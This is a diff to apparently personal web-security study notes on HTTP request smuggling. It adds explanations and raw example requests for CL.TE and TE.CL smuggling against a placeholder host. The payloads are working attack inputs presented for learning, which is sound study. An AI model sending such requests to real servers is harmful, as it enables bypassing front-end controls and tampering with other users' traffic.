@@ -298,18 +298,26 @@ TABLE OF CONTENTS
         14.2 EXPLOITS
                 14.2.1 BASIC CL.TE
                         - First server inteprets Content-Length. Second interprets Transfer-Encoding.
-                        - Second request will return "Unrecognized method GPOST". 
+                        - Create message with smuggled part at the end. Then, add newlines and 0 at beginning to trick TE server. Update Content-Length appropriately.
                         POST / HTTP/1.1
-                        Host: 0a4c007804eca518c57ef0d400d8002a.web-security-academy.net
-                        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0
-                        Content-Type: application/x-www-form-urlencoded
-                        Content-Length: 10
-                        Connection: keep-alive
+                        Host: vulnerable-website.com
+                        Content-Length: 13
                         Transfer-Encoding: chunked
 
                         0
 
-                        G
+                        SMUGGLED
+                14.2.2 BASIC TE.CL
+                        - First server interprets Transfer-Encoding, Second interprets Content-Length
+                        - Create a normal chunked message that will be smuggled. Then, craft Content-Length header to cut off before it begins. The below example cuts off a "8". 
+                                POST / HTTP/1.1
+                                Host: vulnerable-website.com
+                                Content-Length: 3
+                                Transfer-Encoding: chunked
+
+                                8
+                                SMUGGLED
+                                0
 19. DIRBUSTER
         19.1 ADVANCED OPTIONS
                 19.1.1 HTTP OPTIONS
